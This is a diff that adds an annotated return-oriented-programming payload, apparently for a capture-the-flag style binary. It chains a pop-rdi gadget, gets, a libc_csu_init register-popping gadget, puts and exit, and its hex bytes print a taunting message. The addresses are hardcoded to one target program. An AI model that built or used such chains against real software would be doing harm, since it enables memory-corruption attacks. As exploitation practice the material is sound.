@@ -1,0 +1,51 @@
+<garbage>               ; ret to 0x401203
+03 12 40 00 00 00 00 00 ; <popped and retjmped to>
+40 40 40 00 00 00 00 00 ; pop rdi sets rdi = 0x404040
+                        ; ret at 401204> 
+40 10 40 00 00 00 00 00 ; ret at 401204 pops this one and jmps to 0x401040
+                        ; gets(rdi) == gets(0x404040) is called
+                        ; afterwards, retjmps to 0x401203
+03 12 40 00 00 00 00 00 ; pop rdi sets rdi = 0x404040 (again)
+40 40 40 00 00 00 00 00 
+
+fb 11 40 00 00 00 00 00 ; retjmp to 0x4011fb (end of lib_csu_init, popping rbp,
+                        ; r12, r13, r14, 15)
+f3 42 8c 2e 53 2e cc 23 ; rbp := this 
+a9 d7 4b 07 f3 93 06 bf ; r12 := this
+da a5 f1 30 5a 24 c5 1d ; r13 := this
+f1 e4 ba 5f 83 9a 24 65 ; r14 := this
+7a 5b a7 ae f4 3f 02 98 ; r15 := this
+
+30 10 40 00 00 00 00 00 ; retjmp to 0x401030
+                        ; jmp to puts(rdi) = puts(0x404040)
+                        ; afterwards, jmp to 401203
+
+03 12 40 00 00 00 00 00 ; pop rdi sets rdi = 0x2b
+2b 00 00 00 00 00 00 00 
+
+50 10 40 00 00 00 00 00 ; retjmp to 0x401050 (exit)
+
+0a 49 20 77 69 6c 6c 20
+74 72 79 20 62 65 69 6e
+67 20 6e 69 63 65 72 2c
+20 69 66 20 79 6f 75 20
+74 72 79 20 62 65 69 6e
+67 20 73 6d 61 72 74 65
+72 0a
+
+
+gets(0x404040)
+
+
+
+
+
+ |P.@......I will |
+ |try being nicer,|
+ | if you try bein|
+ |g smarter.|
+
+ <start> retjmp to 401203
+ 401203 set rdi = 0x404040 using pop rdi
+ 401204 retjmp to 401040
+ 401040 jmp to gets, afterwards retjmp to 401203
